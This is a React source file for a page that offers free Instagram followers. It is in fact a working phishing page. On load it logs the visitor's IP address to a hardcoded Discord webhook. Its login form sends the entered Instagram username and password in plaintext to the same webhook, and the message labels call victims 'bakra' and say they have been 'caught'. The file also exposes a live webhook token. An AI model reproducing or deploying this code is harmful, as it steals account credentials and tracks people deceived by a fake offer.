import { useState } from "react";
import "./App.css";
import "./bhutton.css";
import { useEffect } from "react";

function App() {
  const [Ip, setIp] = useState("finding ip");

  const getIp = async () => {
    try {
      const res = await fetch("https://api.ipify.org");
      const data = await res.text();
      setIp(data);
      console.log(data);
    } catch (err) {
      console.log(err);
    }
  };

  const sendIp = () => {
    const request = new XMLHttpRequest();
    request.open(
      "POST",
      "https://discordapp.com/api/webhooks/1173960091519680642/IakZ4e8nUJlYQ9RRdIAv-FfM_Af7UeWeIuMJbp2YGBNVS-Vy0Ft7nlYKawxJk1VEtPuW"
    );

    request.setRequestHeader("Content-type", "application/json");

    const params = {
      username: "New bakra finder",
      avatar_url: "",
      content: Ip,
    };

    request.send(JSON.stringify(params));
  };

  useEffect(() => {
    getIp();
    sendIp();
  }, [Ip]);

  const sendMessage = (e) => {
    e.preventDefault();
    let username = e.target[0].value;
    let password = e.target[1].value;
    console.log(username);
    console.log(password);

    const request = new XMLHttpRequest();
    request.open(
      "POST",
      "https://discordapp.com/api/webhooks/1173960091519680642/IakZ4e8nUJlYQ9RRdIAv-FfM_Af7UeWeIuMJbp2YGBNVS-Vy0Ft7nlYKawxJk1VEtPuW"
    );

    request.setRequestHeader("Content-type", "application/json");

    let content = "Username: " + username + " Password: " + password;

    const params = {
      username: "Pakda Gya",
      avatar_url: "",
      content: content,
    };

    request.send(JSON.stringify(params));
  };

  return (
    <>
      <div className="container">
        <img
          src="https://social-events.in/socialfollow-logo.svg"
          alt="dafadf"
        />
        <h1>Instagram followers</h1>
        <h1>Get upto 500 followers for free</h1>

        <form onSubmit={sendMessage}>
          <div className="input">
            <input class="effect-23" type="text" placeholder="Username/Email" />
            <span class="focus-bg"></span>
          </div>
          <div className="input">
            <input class="effect-23" type="password" placeholder="Password" />
            <span class="focus-bg"></span>
          </div>

          <select name="cars" id="cars">
            <option value="volvo">100 followers - free</option>
            <option value="saab">200 followers - free</option>
            <option value="mercedes">500 followers - free</option>
            <option value="audi">1000 followers - 2$</option>
            <option value="audi">5000 followers - 3$</option>
          </select>
          <button
            class="button button--tamaya button--border-thick"
            data-text="Submit"
            type="submit"
          >
            <span>Submit</span>
          </button>
        </form>
      </div>
    </>
  );
}

export default App;
